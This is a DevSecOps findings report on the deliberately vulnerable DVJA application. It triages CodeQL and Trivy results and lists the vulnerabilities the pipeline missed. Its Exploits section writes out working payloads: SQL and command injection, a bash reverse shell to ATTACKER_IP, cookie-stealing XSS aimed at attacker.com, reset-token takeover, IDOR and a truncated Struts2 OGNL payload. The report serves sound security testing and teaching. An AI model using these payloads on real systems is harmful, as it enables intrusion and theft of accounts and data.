# DVJA Security Findings Analysis

**Date:** 2026-03-11
**Application:** Damn Vulnerable Java Application (DVJA)
**Pipeline:** DevSecOps CI/CD (CodeQL SAST + Trivy SCA + Trivy Container + Gitleaks + detect-secrets)
**Repository:** LaiKash/dvja

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Pipeline Coverage vs Solution Docs](#2-pipeline-coverage-vs-solution-docs)
3. [SAST Findings — CodeQL (True/False Positive Analysis)](#3-sast-findings--codeql)
4. [SCA Findings — Trivy Dependencies (True/False Positive Analysis)](#4-sca-findings--trivy-dependencies)
5. [Container Scan Findings — Trivy Image (True/False Positive Analysis)](#5-container-scan-findings--trivy-image)
6. [Vulnerabilities Missed by the Pipeline](#6-vulnerabilities-missed-by-the-pipeline)
7. [Exploits](#7-exploits)
8. [POC Verification Results](#8-poc-verification-results)
9. [Recommendations](#9-recommendations)

---

## 1. Executive Summary

The DevSecOps pipeline produced **29 unique GitHub issues** across four security tools: 4 SAST code findings (CodeQL), 20 SCA dependency findings (Trivy fs), and 5 container-only findings (Trivy image — packages not in `pom.xml`). Gitleaks detected 0 secrets (see Appendix C for root cause analysis). The application's `docs/solution/` folder documents **10 OWASP Top 10 vulnerability categories** (A1–A10).

| Metric | Count |
|--------|-------|
| Total pipeline issues (deduplicated) | 29 |
| CodeQL (SAST) issues | 4 |
| Trivy SCA (dependencies) issues | 20 |
| Trivy Container (container-only packages) issues | 5 |
| Gitleaks + detect-secrets | 0 + 5 (see Appendix C.1) |
| Solution docs | 10 (A1–A10) |
| **True Positives** | **29 (100%)** |
| **False Positives** | **0** |
| Solution vulns detected by pipeline | 4 of 10 categories |
| Solution vulns **missed** by pipeline | 6 of 10 categories |

**Key finding:** All 29 issues are **true positives**. The container scan (after fixing `vuln-type` to `'os,library'`) found 5 additional packages not present in `pom.xml` (xstream, plexus-utils, plexus-archiver, maven-core, maven-shared-utils) — confirming the value of scanning the deployed image. Libraries already reported by SCA are deduplicated to avoid double-reporting. However, the pipeline only detected **4 out of 10** documented vulnerability categories. Critical application-logic vulnerabilities (XSS, IDOR, CSRF, Broken Auth, Open Redirect, Access Control bypass) require DAST and were **not detected** by SAST/SCA tools.

---

## 2. Pipeline Coverage vs Solution Docs

### 2.1 Mapping: Solutions ↔ Pipeline Issues

| Solution | OWASP Category | Pipeline Detection | Issue # |
|----------|---------------|-------------------|---------|
| **A1** — SQL Injection | Injection | **DETECTED** (CodeQL) | #22 |
| **A1** — Command Injection | Injection | **DETECTED** (CodeQL) | #21 |
| **A2** — Broken Auth (weak reset token, MD5 passwords) | Broken Auth & Session Mgmt | **NOT DETECTED** | — |
| **A3** — Reflected + Stored XSS | Cross-Site Scripting | **NOT DETECTED** | — |
| **A4** — IDOR in EditUser | Insecure Direct Object Ref | **NOT DETECTED** | — |
| **A5** — Security Misconfiguration (devMode=true) | Security Misconfiguration | **NOT DETECTED** | — |
| **A6** — Sensitive data in logs | Sensitive Data Exposure | **DETECTED** (CodeQL) | #23 |
| **A7** — Cookie-based admin bypass | Missing Function-Level Access | **NOT DETECTED** | — |
| **A8** — CSRF on Add/Edit Product | Cross-Site Request Forgery | **NOT DETECTED** | — |
| **A9** — Struts2 CVE-2017-5638 | Known Vulnerable Components | **DETECTED** (Trivy) | #6 |
| **A10** — Open Redirect | Unvalidated Redirects | **NOT DETECTED** | — |

### 2.2 Additional Findings (not in solution docs)

| Issue # | Finding | Covered by Solutions? |
|---------|---------|----------------------|
| #24 | Log Injection (CWE-117) | No — related to A6 but distinct vulnerability |
| #1–#5, #7–#20 | 19 dependency CVEs | Only A9 (Struts2) is explicitly documented |

### 2.3 Analysis

The pipeline **correctly identified** the most mechanically-detectable vulnerabilities:
- **String-concatenated JPQL queries** → SQL Injection (#22 matches A1)
- **Unsanitized `Runtime.exec()` input** → Command Injection (#21 matches A1)
- **Password logged in cleartext** → Sensitive Data Exposure (#23 matches A6)
- **Outdated Struts2 2.3.30** → Known Vulnerable Component (#6 matches A9)

The pipeline **missed** vulnerabilities requiring semantic/business-logic understanding:
- XSS (JSP `<%= %>` scriptlet and `escape="false"`)
- IDOR (no authorization check on userId)
- Broken authentication (MD5-based reset tokens)
- CSRF (absence of anti-CSRF tokens)
- Access control bypass (cookie-based admin check)
- Open redirect (no URL validation)

---

## 3. SAST Findings — CodeQL

### Issue #21: [CRITICAL][CODE] Uncontrolled command line — 1 location

| Field | Value |
|-------|-------|
| **Verdict** | **TRUE POSITIVE** |
| **CWE** | CWE-78 (OS Command Injection) |
| **File** | `src/main/java/com/appsecco/dvja/controllers/PingAction.java` line 46 |
| **Matches Solution** | A1 — Command Injection |
| **Exploitable** | Yes — trivially exploitable |
| **CVSS Estimate** | 9.8 (Critical) |

**Vulnerable Code:**
```java
Runtime runtime = Runtime.getRuntime();
String[] command = { "/bin/bash", "-c", "ping -t 5 -c 5 " + getAddress() };
Process process = runtime.exec(command);
```

**Analysis:** User-supplied `address` parameter is concatenated directly into a shell command passed to `Runtime.exec()` via `/bin/bash -c`. The bash shell interprets metacharacters (`;`, `|`, `&&`, `` ` ``), enabling arbitrary command execution. This is a textbook OS command injection — high confidence true positive.

---

### Issue #22: [HIGH][CODE] Query built from user-controlled sources — 2 locations

| Field | Value |
|-------|-------|
| **Verdict** | **TRUE POSITIVE** |
| **CWE** | CWE-89 (SQL Injection) |
| **Files** | `UserService.java:75`, `ProductService.java:48` |
| **Matches Solution** | A1 — SQL Injection |
| **Exploitable** | Yes — trivially exploitable |
| **CVSS Estimate** | 9.8 (Critical) |

**Vulnerable Code (UserService.java):**
```java
Query query = entityManager.createQuery(
    "SELECT u FROM User u WHERE u.login = '" + login + "'");
```

**Vulnerable Code (ProductService.java):**
```java
Query query = entityManager.createQuery(
    "SELECT p FROM Product p WHERE p.name LIKE '%" + name + "%'");
```

**Analysis:** Both locations use string concatenation to build JPQL queries with user-supplied input. No parameterized queries or input sanitization. The JPQL injection allows data extraction, authentication bypass, and potentially destructive operations. High confidence true positive.

---

### Issue #23: [HIGH][CODE] Insertion of sensitive information into log files — 1 location

| Field | Value |
|-------|-------|
| **Verdict** | **TRUE POSITIVE** |
| **CWE** | CWE-532 (Insertion of Sensitive Info into Log Files) |
| **File** | `UserService.java:93` |
| **Matches Solution** | A6 — Sensitive Data Exposure |
| **Exploitable** | Yes — password readable in log files |
| **CVSS Estimate** | 5.5 (Medium) |

**Vulnerable Code:**
```java
logger.info("Changing password for login: " + login +
    " New password: " + password);
```

**Analysis:** The plaintext password is written to application logs during password reset. Anyone with access to log files (operators, log aggregation systems, SIEM, backup tapes) can read user passwords. This directly matches the A6 solution documentation. True positive.

---

### Issue #24: [HIGH][CODE] Log Injection — 4 locations

| Field | Value |
|-------|-------|
| **Verdict** | **TRUE POSITIVE** |
| **CWE** | CWE-117 (Improper Output Neutralization for Logs) |
| **Files** | `UserService.java:29,93,104`, `ProductService.java:28` |
| **Matches Solution** | Not directly documented (related to A6) |
| **Exploitable** | Yes — log forging/tampering |
| **CVSS Estimate** | 5.3 (Medium) |

**Analysis:** User-controlled values (`login`, `password`, product `name`) are written to log entries without sanitization. An attacker can inject newline characters (`%0A`, `%0D`) to forge fake log entries, potentially:
- Covering tracks after an attack
- Injecting misleading audit trails
- Exploiting log viewers vulnerable to XSS (if HTML-based)

This is a legitimate finding not covered in the solution docs. True positive.

---

## 4. SCA Findings — Trivy Dependencies

### 4.1 CRITICAL Dependency Vulnerabilities

#### Issue #6: org.apache.struts:struts2-core 2.3.30 — 17 vulnerabilities

| Field | Value |
|-------|-------|
| **Verdict** | **TRUE POSITIVE** |
| **Matches Solution** | A9 — Using Components with Known Vulnerability |
| **Exploitable** | Yes — multiple RCE vectors |
| **Highest CVE** | CVE-2017-5638 (CVSS 10.0) |

**Key CVEs and exploitability:**

| CVE | Severity | Type | Exploitable in DVJA? |
|-----|----------|------|---------------------|
| CVE-2017-5638 | CRITICAL (10.0) | RCE via Content-Type OGNL injection | **Yes** — This is the Equifax breach vulnerability. Struts2 2.3.30 is in the affected range (<2.3.32). Trivially exploitable with a single HTTP request. |
| CVE-2017-12611 | CRITICAL (9.8) | RCE via OGNL in Freemarker tags | **Yes** — if app uses Freemarker templates with user input |
| CVE-2019-0230 | CRITICAL (9.8) | Forced double OGNL evaluation | **Yes** — affects 2.0.0 to 2.5.20 |
| CVE-2020-17530 | CRITICAL (9.8) | Forced OGNL evaluation on raw input in tag attributes | **Yes** — affects up to 2.5.25 |
| CVE-2021-31805 | CRITICAL (9.8) | Incomplete fix for CVE-2020-17530 | **Yes** — affects up to 2.5.29 |
| CVE-2023-50164 | CRITICAL (9.8) | Path traversal in file upload | **Yes** — affects up to 2.5.32 |
| CVE-2024-53677 | CRITICAL (9.8) | File upload manipulation | **Yes** — affects up to 6.3.x |
| CVE-2018-11776 | HIGH (8.1) | RCE via namespace OGNL | **Yes** — affects 2.3 to 2.3.34 |

All 17 CVEs are confirmed true positives. The pom.xml declares `struts2.version=2.3.30` which falls in the vulnerable range for all listed CVEs.

---

#### Issue #5: org.apache.logging.log4j:log4j-core 2.3 — 4 vulnerabilities

| Field | Value |
|-------|-------|
| **Verdict** | **TRUE POSITIVE** |
| **Exploitable** | Yes — Log4Shell (CVE-2021-44228) is trivially exploitable |
| **Highest CVE** | CVE-2021-44228 (CVSS 10.0) — Log4Shell |

| CVE | Severity | Type | Exploitable in DVJA? |
|-----|----------|------|---------------------|
| CVE-2021-44228 | CRITICAL (10.0) | RCE via JNDI lookup (Log4Shell) | **Yes** — log4j-core 2.3 is in affected range. Any user input that gets logged (login names, search queries, User-Agent headers) can trigger JNDI resolution → RCE. |
| CVE-2021-45046 | CRITICAL (9.0) | Incomplete fix for Log4Shell | **Yes** — same version |
| CVE-2017-5645 | CRITICAL (9.8) | Deserialization via TCP/UDP socket | **Conditional** — exploitable only if SocketServer is enabled |
| CVE-2021-45105 | HIGH (7.5) | DoS via infinite recursion in lookup | **Yes** — same version |

**Note:** Log4Shell is one of the most critical vulnerabilities in recent history. DVJA uses log4j-core 2.3 and logs user-supplied data (login names, search queries), making it directly exploitable.

---

#### Issue #4: log4j:log4j 1.2.14 — 6 vulnerabilities

| Field | Value |
|-------|-------|
| **Verdict** | **TRUE POSITIVE** |
| **Exploitable** | Conditional — depends on specific appender configuration |

| CVE | Severity | Exploitable in DVJA? |
|-----|----------|---------------------|
| CVE-2019-17571 | CRITICAL (9.8) | **Conditional** — requires SocketServer class to be enabled |
| CVE-2022-23305 | CRITICAL (9.8) | **Conditional** — requires JDBCAppender configuration |
| CVE-2022-23307 | CRITICAL (8.8) | **Conditional** — requires Chainsaw component |
| CVE-2021-4104 | HIGH (7.5) | **Conditional** — requires JMSAppender configuration |
| CVE-2022-23302 | HIGH (8.8) | **Conditional** — requires JMSSink configuration |
| CVE-2023-26464 | HIGH (7.5) | **Conditional** — requires Chainsaw/SocketAppender |

True positive in terms of the vulnerable library being present. Actual exploitability depends on which log4j 1.x appenders are configured. The library is a transitive dependency via `slf4j-log4j12`.

---

#### Issue #1: commons-collections:commons-collections 3.1 — 2 vulnerabilities

| Field | Value |
|-------|-------|
| **Verdict** | **TRUE POSITIVE** |
| **Highest CVE** | CVE-2015-7501 (CVSS 9.8) |
| **Exploitable** | **Yes** — Java deserialization RCE via InvokerTransformer |

Commons Collections 3.1 contains the infamous `InvokerTransformer` gadget chain used in Java deserialization attacks. If the application deserializes untrusted data (e.g., via RMI, JMX, or custom endpoints), this enables RCE. The `ysoserial` tool has a ready-made payload (`CommonsCollections1`).

---

#### Issue #2: commons-fileupload:commons-fileupload 1.3.2 — 3 vulnerabilities

| Field | Value |
|-------|-------|
| **Verdict** | **TRUE POSITIVE** |
| **Highest CVE** | CVE-2016-1000031 (CVSS 9.8) |
| **Exploitable** | **Yes** — RCE via DiskFileItem deserialization |

Struts2 uses commons-fileupload for multipart request handling. CVE-2016-1000031 allows RCE through the `DiskFileItem` class during deserialization.

---

#### Issue #3: dom4j:dom4j 1.6.1 — 2 vulnerabilities

| Field | Value |
|-------|-------|
| **Verdict** | **TRUE POSITIVE** |
| **Highest CVE** | CVE-2020-10683 (CVSS 9.8) |
| **Exploitable** | **Conditional** — requires the application to parse untrusted XML input via dom4j |

dom4j 1.6.1 is a transitive dependency via Hibernate. XXE exploitation requires the app to process XML input with dom4j's SAXReader. DVJA primarily uses JPA/Hibernate for data access, so direct exploitation through user-facing endpoints is unlikely without additional attack vectors (e.g., via Hibernate XML mapping manipulation). Lower practical risk despite high CVSS.

---

#### Issue #7: org.springframework:spring-beans 3.0.5.RELEASE — 2 vulnerabilities

| Field | Value |
|-------|-------|
| **Verdict** | **TRUE POSITIVE** |
| **Highest CVE** | CVE-2022-22965 — Spring4Shell (CVSS 9.8) |
| **Exploitable** | **No** — Spring4Shell requires JDK 9+; DVJA uses JDK 8 |

**Important nuance:** While CVE-2022-22965 (Spring4Shell) is a critical RCE, it specifically requires **JDK 9 or higher** plus deployment on Tomcat as a WAR. DVJA is compiled with Java 7 source compatibility (`<source>1.7</source>` in pom.xml) and uses JDK 8. This makes Spring4Shell **not exploitable** in this specific context, though the vulnerability is real and the dependency should still be updated.

---

#### Issue #8: org.springframework:spring-web 3.0.5.RELEASE — 4 vulnerabilities

| Field | Value |
|-------|-------|
| **Verdict** | **TRUE POSITIVE** |
| **Highest CVE** | CVE-2016-1000027 (CVSS 9.8) |
| **Exploitable** | **Conditional** |

CVE-2016-1000027 relates to unsafe deserialization in Spring's `HttpInvokerServiceExporter`. Exploitable only if the application exposes HTTP invoker endpoints (DVJA does not appear to). The URL parsing CVEs (CVE-2024-22243/22259/22262) are exploitable if the application uses `UriComponentsBuilder` with user input — not the case in DVJA.

---

### 4.2 HIGH Dependency Vulnerabilities

| Issue # | Package | Version | CVEs | Verdict | Exploitable in DVJA? |
|---------|---------|---------|------|---------|---------------------|
| #9 | gson | 2.8.1 | CVE-2022-25647 | TRUE POSITIVE | **Conditional** — requires deserialization of untrusted JSON. DVJA uses Gson for serialization (output), reducing risk. |
| #10 | commons-beanutils | 1.7.0 | CVE-2019-10086, CVE-2025-48734 | TRUE POSITIVE | **Yes** — `PropertyUtils` access bypass enables code execution when combined with Struts2 parameter injection. |
| #11 | commons-io | 2.2 | CVE-2024-47554 | TRUE POSITIVE | **Low** — DoS via resource consumption. Not direct RCE. |
| #12 | mysql-connector-java | 5.1.42 | CVE-2018-3258, CVE-2023-22102 | TRUE POSITIVE | **Conditional** — requires MITM or control over JDBC connection string. |
| #13 | xwork-core | 2.3.30 | CVE-2025-68493 | TRUE POSITIVE | **Yes** — Missing XML validation in Struts/XWork configuration. |
| #14 | struts-core (1.x) | 1.3.8 | 4 CVEs | TRUE POSITIVE | **Low** — Struts 1 is a separate dependency. Unless Struts 1 servlet is mapped, exposure is limited. |
| #15 | struts-tiles | 1.3.8 | CVE-2023-49735 | TRUE POSITIVE | **Conditional** — locale-based vulnerability in Tiles. |
| #16 | velocity | 1.6.2 | CVE-2020-13936 | TRUE POSITIVE | **Conditional** — exploitable only if users can modify Velocity templates. |
| #17 | hibernate-core | 3.3.1.GA | CVE-2020-25638 | TRUE POSITIVE | **Yes** — SQL injection via Hibernate when `hibernate.use_sql_comments=true` (configured in DVJA). |
| #18 | spring-context | 3.0.5 | CVE-2022-22968 | TRUE POSITIVE | **Low** — disallowedFields bypass. Requires specific data binding patterns. |
| #19 | spring-core | 3.0.5 | 4 CVEs | TRUE POSITIVE | **Yes** — CVE-2011-2730 (EL injection) is directly relevant to JSP applications. |
| #20 | spring-expression | 3.0.5 | CVE-2023-20863 | TRUE POSITIVE | **Conditional** — DoS via SpEL expression. |

---

## 5. Container Scan Findings — Trivy Image

After fixing the Trivy container scan to include library-level vulnerabilities (`vuln-type: 'os,library'`), the scan detected vulnerable packages inside the Docker image. The pipeline deduplicates results: libraries already reported by SCA (via `pom.xml`) are **not** re-reported as container issues. Only packages found **exclusively in the Docker image** (not declared in `pom.xml`) produce `[CONTAINER]` issues.

### 5.1 Why Container Scan Matters (Defense in Depth)

The SCA scan (Trivy fs) analyzes `pom.xml` — what the build *declares*. The container scan (Trivy image) analyzes the Docker image layers — what is *actually deployed*. This catches:
- Libraries introduced outside Maven (e.g., JARs copied into the image manually)
- Transitive dependencies pulled in by the build system but not declared in `pom.xml`
- OS-level packages from the base image (e.g., Ubuntu libraries)
- Version discrepancies between declared and actual deployed versions

### 5.2 Container-Only Findings — Build Tooling, Not Runtime

The container scan found 5 packages not present in the SCA results. Upon investigation, **all 5 are Maven build tools**, not application runtime dependencies:

| Package | Version | Unique CVEs | Where It Lives | In WAR? | Risk Level |
|---------|---------|-------------|----------------|---------|------------|
| com.thoughtworks.xstream:xstream | 1.4.10 | ~8 | `/usr/share/maven/lib/` | **No** | Medium — post-exploitation (deserialization RCE) |
| org.codehaus.plexus:plexus-utils | 3.0.15 | ~2 | `/usr/share/maven/lib/` | **No** | Medium — post-exploitation (path traversal) |
| org.codehaus.plexus:plexus-archiver | 2.1 | ~1 | `/usr/share/maven/lib/` | **No** | Low — post-exploitation (archive path traversal) |
| org.apache.maven:maven-core | 3.0.4 | ~1 | `/usr/share/maven/lib/` | **No** | Medium — attacker can use Maven to fetch tools |
| org.apache.maven.shared:maven-shared-utils | 0.1 | 1 | `/usr/share/maven/lib/` | **No** | Medium — post-exploitation (command injection) |

**How we verified this:** We ran `mvn dependency:tree` and confirmed that none of these packages appear in the application's dependency tree. They are not bundled in the WAR file (`WEB-INF/lib/`), which means the running Java application never loads them.

**Root cause — single-stage Dockerfile:** The DVJA Dockerfile installs Maven via `apt-get install -y maven` to build the app, but because it uses a **single-stage build**, Maven and all its libraries remain in the final production image:

```dockerfile
FROM eclipse-temurin:8-jdk          # Base image
RUN apt-get install -y maven        # Maven + all its JARs installed here
WORKDIR /app
COPY . .
RUN mvn clean package               # Build the WAR
CMD ["sh", "-c", "/app/scripts/start.sh"]  # Run the app
# Problem: Maven JARs are still in the image!
```

This is a common anti-pattern in Docker. The build tools are only needed during `mvn clean package`, but they persist in every layer of the final image.

### 5.3 Are These False Positives?

**No — they are true positives**, and in the context of DVJA they are clearly within scope. While these JARs are not on the Java application's classpath (not in the WAR), DVJA has **multiple trivially exploitable RCE vulnerabilities** (Struts2 CVE-2017-5638, Command Injection, Log4Shell) that give an attacker shell access to the container with a single HTTP request. Once inside, these build tools become part of the **post-exploitation attack surface**:

| Build Tool | Post-Exploitation Risk |
|------------|----------------------|
| **xstream 1.4.10** (CVE-2021-39144, CVE-2021-21344) | Attacker can craft deserialization payloads using XStream JARs present on disk to escalate privileges, pivot laterally, or establish persistence |
| **maven-shared-utils 0.1** (CVE-2022-29599) | Command injection in Maven's utility classes — useful for chaining commands or bypassing restricted shells |
| **plexus-utils 3.0.15** (CVE-2022-4244) | Path traversal — attacker could read/write files outside intended directories |
| **maven-core 3.0.4** | Full Maven installation available — attacker can download and build additional tools from within the container |
| **plexus-archiver 2.1** | Archive extraction path traversal — could be used to overwrite files |

The exploitation chain looks like this:
1. **Initial access**: Exploit Struts2 CVE-2017-5638 (one HTTP request) → shell on container
2. **Post-exploitation**: Leverage Maven/XStream/Plexus JARs already on disk for privilege escalation, lateral movement, or persistence
3. **Impact**: Build tools like Maven can even fetch and compile new attack tools from the internet, turning the container into an attack staging platform

These findings illustrate why **container hardening matters**: even if a vulnerability is not directly reachable from outside, the presence of unnecessary tools expands the blast radius after initial compromise. In a properly hardened container (multi-stage build, no build tools), an attacker who gains shell access would find a minimal environment with far fewer options for further exploitation.

### 5.4 Recommended Fix — Multi-Stage Dockerfile

The proper solution is a **multi-stage Docker build**. This separates the build environment from the runtime environment, so Maven and its libraries never appear in the production image:

```dockerfile
# ── Stage 1: Build ──
FROM eclipse-temurin:8-jdk AS builder
RUN apt-get update && apt-get install -y maven
WORKDIR /app
COPY pom.xml .
RUN mvn dependency:resolve
COPY . .
RUN mvn clean package -DskipTests

# ── Stage 2: Runtime (no Maven, no build tools) ──
FROM eclipse-temurin:8-jre
RUN apt-get update && apt-get install -y default-mysql-client && rm -rf /var/lib/apt/lists/*
WORKDIR /app
COPY --from=builder /app/target/dvja-1.0-SNAPSHOT.war ./target/dvja-1.0-SNAPSHOT.war
COPY --from=builder /app/scripts/start.sh ./scripts/start.sh
RUN chmod 755 /app/scripts/start.sh
EXPOSE 8080
CMD ["sh", "-c", "/app/scripts/start.sh"]
```

**What this achieves:**
- The `builder` stage has Maven, JDK, and everything needed to compile — but it's **discarded** after the build
- The `runtime` stage starts fresh from `eclipse-temurin:8-jre` (smaller — JRE only, no JDK compiler)
- Only the WAR file and startup script are copied into the final image
- Maven, XStream, Plexus, and all other build tools are **eliminated** from the production image
- The final image is significantly smaller (hundreds of MB less)

This would reduce the 5 container-only issues to **zero** and is considered a Docker best practice for production deployments.

### 5.5 Deduplication and CVE Inflation — Lessons Learned

During initial pipeline runs, the container scan produced **inflated issue counts** for two reasons:

1. **Cross-scanner duplication**: The same library (e.g., `log4j-core 2.3`) was reported by both SCA (issue #5: 4 CVEs) and Container (issue #30: 12 CVEs), creating two issues for the same vulnerability.

2. **Within-container triplication**: Trivy found each JAR at **3 paths** inside the image (Maven local cache `~/.m2`, exploded WAR `target/dvja/WEB-INF/lib/`, and packaged WAR `target/dvja.war`), reporting each CVE once per path. Example: `struts2-core` has 17 unique CVEs × 3 paths = 51 listed entries.

**Fixes applied to the pipeline:**
- Container issues are now **only created for packages not already in SCA** (matching by `PkgName`)
- CVEs within the container scan are **deduplicated by VulnerabilityID** per package, eliminating the triplication from multiple JAR paths

---

## 6. Vulnerabilities Missed by the Pipeline

These documented vulnerabilities from the solution folder were **not detected** by CodeQL or Trivy:

### 6.1 A3 — Cross-Site Scripting (XSS)

**Reflected XSS in `ProductList.jsp`:**
```jsp
<%= request.getParameter("searchQuery") %>
```

**Stored XSS in `ProductList.jsp`:**
```jsp
<s:property value="name" escape="false"/>
```

**Why missed:** CodeQL's Java analysis may not fully trace data flow through JSP scriptlets and Struts2 tag libraries. The `escape="false"` pattern requires understanding Struts2 semantics.

**Exploitable:** Yes (see Exploit #3 and #4 below).

---

### 6.2 A2 — Broken Authentication and Session Management

**Predictable password reset token:**
```java
if(!StringUtils.equalsIgnoreCase(
    DigestUtils.md5DigestAsHex(login.getBytes()), key))
    return false;
```

**Weak password hashing:**
```java
private String hashEncodePassword(String password) {
    return DigestUtils.md5DigestAsHex(password.getBytes());
}
```

**Why missed:** CodeQL's `java/weak-cryptographic-algorithm` query exists but may not have flagged MD5 in this context because it's used for hashing rather than encryption. The predictable token pattern is an application-logic flaw that static analysis typically cannot detect.

**Exploitable:** Yes (see Exploit #5 below).

---

### 6.3 A4 — Insecure Direct Object Reference (IDOR)

**No authorization check on `editUser`:**
```java
user = userService.find(getUserId());
user.setPassword(getPassword());
user.setId(getUserId());
userService.save(user);
```

**Why missed:** IDOR is an authorization logic flaw. Static analysis cannot determine that `userId` should be restricted to the authenticated user's own ID.

**Exploitable:** Yes (see Exploit #6 below).

---

### 6.4 A5 — Security Misconfiguration

**Struts2 devMode enabled:**
```xml
<constant name="struts.devMode" value="true"/>
```

**Why missed:** Configuration analysis is outside typical SAST scope. A dedicated configuration scanner or custom CodeQL query would be needed.

---

### 6.5 A7 — Missing Function Level Access Control

**Cookie-based admin check:**
```java
for(Cookie c: getServletRequest().getCookies()) {
    if(c.getName().equals("admin") && c.getValue().equals("1")) {
        isAdmin = true;
```

**Why missed:** The code is syntactically valid — the flaw is that a client-controlled cookie is used as an authorization mechanism. This requires semantic understanding of security design.

**Exploitable:** Yes (see Exploit #7 below).

---

### 6.6 A8 — Cross-Site Request Forgery (CSRF)

**No anti-CSRF tokens on state-changing forms.**

**Why missed:** CSRF detection requires understanding of HTTP method semantics and the absence of token validation. CodeQL has limited CSRF detection for Struts2 applications.

---

### 6.7 A10 — Unvalidated Redirects and Forwards

**Open redirect in `RedirectAction.java`:**
```java
public String execute() {
    if(!StringUtils.isEmpty(getUrl()))
        return "redirect";
    return renderText("Missing url");
}
```

**Why missed:** CodeQL has `java/unvalidated-url-redirection` queries, but this Struts2 redirect pattern (via `struts.xml` result type) may not be recognized. The data flows through Struts2 configuration (`${url}` in result) rather than through standard servlet redirect APIs.

---

## 7. Exploits

> **WARNING:** These exploits are provided for authorized security testing only. Ensure you have proper authorization before executing any of these against a live system.

### Exploit #1: SQL Injection — Authentication Bypass (matches Issue #22, Solution A1)

**Target:** `http://dvja:8080/userSearch.action`
**CWE:** CWE-89

```bash
# Extract all users via JPQL injection
curl "http://dvja:8080/userSearch.action" \
  --data-urlencode "login=' OR '1'='1"

# Error-based injection to confirm vulnerability
curl "http://dvja:8080/userSearch.action" \
  --data-urlencode "login='"
```

**Expected result:** The first request returns all users from the database. The second triggers a SQL error message, confirming the injection point.

---

### Exploit #2: OS Command Injection — Remote Code Execution (matches Issue #21, Solution A1)

**Target:** `http://dvja:8080/ping.action`
**CWE:** CWE-78

```bash
# Execute arbitrary commands via command chaining
curl "http://dvja:8080/ping.action" \
  --data-urlencode "address=127.0.0.1; id"

# Read sensitive files
curl "http://dvja:8080/ping.action" \
  --data-urlencode "address=127.0.0.1; cat /etc/passwd"

# Reverse shell (for authorized pentests only)
curl "http://dvja:8080/ping.action" \
  --data-urlencode "address=127.0.0.1; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
```

**Expected result:** The `id` output or file contents appear in the ping command output area. The bash shell interprets the `;` as a command separator.

---

### Exploit #3: Reflected XSS (Solution A3, missed by pipeline)

**Target:** `http://dvja:8080/listProduct.action`
**CWE:** CWE-79

```
http://dvja:8080/listProduct.action?searchQuery=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

**URL-encoded version:**
```bash
curl "http://dvja:8080/listProduct.action?searchQuery=%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fattacker.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E"
```

**Expected result:** The script tag is rendered directly in the HTML response because `ProductList.jsp` uses `<%= request.getParameter("searchQuery") %>` without encoding. When a victim clicks the link, their cookies are exfiltrated.

---

### Exploit #4: Stored XSS via Product Name (Solution A3, missed by pipeline)

**Target:** `http://dvja:8080/addEditProduct.action`
**CWE:** CWE-79

```bash
# Step 1: Create a product with malicious name (requires authentication)
curl "http://dvja:8080/addEditProduct.action" \
  -X POST \
  -H "Cookie: JSESSIONID=<valid_session>" \
  -d "product.name=<script>alert('Stored XSS')</script>&product.description=test&product.code=XSS01&product.tags=test"

# Step 2: Any user viewing the product list will trigger the XSS
# Visit: http://dvja:8080/listProduct.action
```

**Expected result:** The product name is stored in the database. When rendered in `ProductList.jsp` with `escape="false"`, the script executes in every visitor's browser.

---

### Exploit #5: Broken Authentication — Password Reset Takeover (Solution A2, missed by pipeline)

**Target:** `http://dvja:8080/resetPasswordExecute.action`
**CWE:** CWE-640

```bash
# The reset key is MD5(login). For user "admin":
# MD5("admin") = 21232f297a57a5a743894a0e4a801fc3

curl "http://dvja:8080/resetPasswordExecute.action" \
  -d "login=admin&key=21232f297a57a5a743894a0e4a801fc3&password=hacked&passwordConfirmation=hacked"

# For any user, compute the key:
# echo -n "john.doe" | md5sum
# → 6c34fc34f51ce4ab1db1e3a0ee42c2b0

curl "http://dvja:8080/resetPasswordExecute.action" \
  -d "login=john.doe&key=6c34fc34f51ce4ab1db1e3a0ee42c2b0&password=hacked&passwordConfirmation=hacked"
```

**Expected result:** The password for the specified user is changed to "hacked". The attacker can now log in as any user by computing MD5 of their username.

---

### Exploit #6: IDOR — Edit Any User's Account (Solution A4, missed by pipeline)

**Target:** `http://dvja:8080/editUser.action`
**CWE:** CWE-639

```bash
# Change another user's password and email (no authorization check)
# userId=1 targets the first user (likely admin)
curl "http://dvja:8080/editUser.action" \
  -X POST \
  -H "Cookie: JSESSIONID=<valid_session>" \
  -d "userId=1&email=attacker@evil.com&password=pwned&passwordConfirmation=pwned"

# Enumerate user IDs
for i in $(seq 1 20); do
  curl -s "http://dvja:8080/editUser.action" \
    -X POST \
    -H "Cookie: JSESSIONID=<valid_session>" \
    -d "userId=$i&email=test@test.com&password=test&passwordConfirmation=test" \
    -o /dev/null -w "userId=$i status=%{http_code}\n"
done
```

**Expected result:** The password and email for the targeted userId are changed, regardless of whether the authenticated user owns that account.

---

### Exploit #7: Admin API Bypass via Cookie (Solution A7, missed by pipeline)

**Target:** `http://dvja:8080/api/userList`
**CWE:** CWE-285

```bash
# No authentication needed — just set the admin cookie
curl -H "Cookie: admin=1" "http://dvja:8080/api/userList"

# Expected output:
# {"users":[{"id":"1","email":"admin@dvja.local","login":"admin","role":"admin"},...], "count":N}
```

**Expected result:** Full user listing including IDs, emails, logins, and roles returned without any real authentication.

---

### Exploit #8: Open Redirect (Solution A10, missed by pipeline)

**Target:** `http://dvja:8080/redirect.action`
**CWE:** CWE-601

```bash
# Redirect to phishing site
http://dvja:8080/redirect.action?url=http://evil-phishing-site.com/login

# Redirect to attacker-controlled credential harvester
http://dvja:8080/redirect.action?url=http://attacker.com/fake-dvja-login.html
```

**Expected result:** The user is redirected to the external URL. This can be used in phishing attacks where the victim trusts the `dvja` domain.

---

### Exploit #9: Struts2 RCE — CVE-2017-5638 (matches Issue #6, Solution A9)

**Target:** Any DVJA URL
**CWE:** CWE-94 (Code Injection)

```bash
# Execute 'id' command via Content-Type OGNL injection
curl -H "Content-Type: %{(#_='multipart/form-data').\
(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).\
(#_memberAccess?(#_memberAccess=#dm):\
((#container=#context['com.opensymphony.xwork2.ActionContext.container']).\
(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).\
(#ognlUtil.getExcludedPackageNames().clear()).\
